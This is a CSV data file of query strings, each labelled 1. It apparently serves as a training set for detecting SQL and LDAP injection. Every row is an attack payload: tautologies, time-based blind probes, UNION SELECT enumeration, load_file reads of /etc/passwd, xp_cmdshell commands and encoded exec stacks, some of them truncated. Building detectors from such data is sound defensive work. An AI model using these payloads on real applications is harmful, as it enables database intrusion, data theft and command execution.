Query,Label
)%20or%20('x'='x,1
%20or%201=1,1
; execute immediate 'sel' || 'ect us' || 'er',1
"benchmark(10000000,MD5(1))#",1
update,1
""";waitfor delay '0:0:__TIME__'--",1
1) or pg_sleep(__TIME__)--,1
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1
"""hi"""") or (""""a""""=""""a""",1
delete,1
like,1
""" or sleep(__TIME__)#",1
pg_sleep(__TIME__)--,1
*(|(objectclass=*)),1
declare @q nvarchar (200) 0x730065006c00650063 ...,1
or 0=0 #,1
insert,1
1) or sleep(__TIME__)#,1
) or ('a'='a,1
; exec xp_regread,1
*|,1
@var select @var as var into temp end --,1
"1)) or benchmark(10000000,MD5(1))#",1
asc,1
(||6),1
"""a"""" or 3=3--""",1
""" or benchmark(10000000,MD5(1))#",1
# from wapiti,1
or 0=0 --,1
1 waitfor delay '0:0:10'--,1
or 'a'='a,1
"hi or 1=1 --""",1
or a = a,1
UNION ALL SELECT,1
) or sleep(__TIME__)=',1
")) or benchmark(10000000,MD5(1))#",1
hi' or 'a'='a,1
0,1
21 %,1
limit,1
or 1=1,1
or 2 > 1,1
""")) or benchmark(10000000,MD5(1))#",1
PRINT,1
hi') or ('a'='a,1
or 3=3,1
));waitfor delay '0:0:__TIME__'--,1
a' waitfor delay '0:0:10'--,1
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",1
or%201=1,1
1 or sleep(__TIME__)#,1
or 1=1,1
and 1 in (select var from temp)--,1
or '7659'='7659,1
or 'text' = n'text',1
--,1
or 1=1 or ''=',1
declare @s varchar (200) select @s = 0x73656c6 ...,1
exec xp,1
; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
3.10E+17,1
""" or pg_sleep(__TIME__)--",1
x' AND email IS NULL; --,1
&,1
admin' or ',1
or 'unusual' = 'unusual',1
//,1
truncate,1
"1) or benchmark(10000000,MD5(1))#",1
\x27UNION SELECT,1
declare @s varchar(200) select @s = 0x77616974 ...,1
tz_offset,1
sqlvuln,1
"""));waitfor delay '0:0:__TIME__'--",1
||6,1
or%201=1 --,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
or a=a,1
) union select * from information_schema.tables;,1
PRINT @@variable,1
or isNULL(1/0) /*,1
26 %,1
""" or ""a""=""a",1
(sqlvuln),1
x' AND members.email IS NULL; --,1
or 1=1--,1
"and 1=( if((load_file(char(110,46,101,120,11 ...",1
0x770061006900740066006F0072002000640065006C00 ...,1
%20'sleep%2050',1
as,1
1)) or pg_sleep(__TIME__)--,1
/**/or/**/1/**/=/**/1,1
union all select @@version--,1
",@variable",1
(sqlattempt2),1
or (EXISTS),1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
%20$(sleep%2050),1
"1 or benchmark(10000000,MD5(1))#",1
%20or%20''=',1
||UTL_HTTP.REQUEST,1
or pg_sleep(__TIME__)--,1
hi' or 'x'='x';,1
""") or sleep(__TIME__)=""",1
or 'whatever' in ('whatever'),1
; begin declare @var varchar(8000) set @var=' ...,1
"union select 1,load_file('/etc/passwd'),1,1,1;",1
0x77616974666F722064656C61792027303A303A313027 ...,1
exec(@s),1
) or pg_sleep(__TIME__)--,1
union select,1
